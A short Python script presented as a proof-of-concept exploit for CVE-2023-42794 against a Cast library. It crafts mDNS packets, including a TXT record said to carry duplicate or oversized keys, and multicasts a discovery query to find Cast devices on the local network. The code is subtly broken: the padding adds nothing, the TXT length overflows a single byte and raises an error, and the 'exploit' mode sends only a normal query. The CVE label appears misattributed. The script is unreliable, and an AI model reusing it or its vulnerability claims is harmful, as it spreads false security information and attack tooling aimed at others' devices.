#!/usr/bin/env python3
"""CVE-2023-42794 — Cast Companion Library. mDNS discovery packet with a
malformed TXT record set (oversized / duplicate keys)."""
import socket, struct, sys

def _name(n: str) -> bytes:
    out = b""
    for label in n.split("."):
        if label: out += bytes([len(label)]) + label.encode()
    return out + b"\x00"

def build() -> bytes:
    # mDNS header: id=0, flags=0, qd=1
    hdr = struct.pack(">HHHHHH", 0, 0, 1, 0, 0, 0)
    q = _name("_googlecast._tcp.local") + struct.pack(">HH", 12, 1)  # PTR IN
    return hdr + q

def build_extra() -> bytes:
    # a response TXT record stuffed with duplicate keys
    txt = b"".join(b"\x03fn=" + b"x" * 0 for _ in range(64)) + b"id=1234"
    txt = bytes([len(txt)]) + txt
    return _name("poc._googlecast._tcp.local") + struct.pack(">HHIH", 16, 1, 120, len(txt)) + txt

def exploit(timeout=4):
    msg = build()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    s.settimeout(timeout)
    s.sendto(msg, ("224.0.0.251", 5353))
    replies = []
    try:
        while True:
            data, addr = s.recvfrom(4096); replies.append((addr[0], len(data)))
    except socket.timeout:
        pass
    s.close()
    for a, n in replies: print(f"[+] cast device {a} ({n}B)")
    return replies

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit": exploit()
    else:
        from pathlib import Path
        Path("cve-2023-42794.mdns").write_bytes(build())
        Path("cve-2023-42794_extra.mdns").write_bytes(build_extra())
        print("[+] CVE-2023-42794 mDNS packets written")

if __name__ == "__main__":
    main()
